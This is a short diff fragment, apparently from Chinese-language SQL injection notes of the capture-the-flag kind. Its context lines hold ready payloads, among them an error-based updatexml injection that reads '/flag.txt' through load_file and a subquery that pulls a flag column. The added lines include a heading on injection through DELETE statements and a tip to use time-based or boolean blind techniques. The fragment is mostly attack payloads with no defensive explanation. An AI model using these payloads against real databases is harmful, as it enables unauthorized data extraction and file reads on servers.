@@ -81,3 +81,12 @@ password=\&username=,username=(select flagass23s3 from flag23a)#
 ```
 1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,30)),0x7e),1)#
 ```
+
+
+
+
+
+
+^
+## **delete注入**
+用时间或布尔盲注
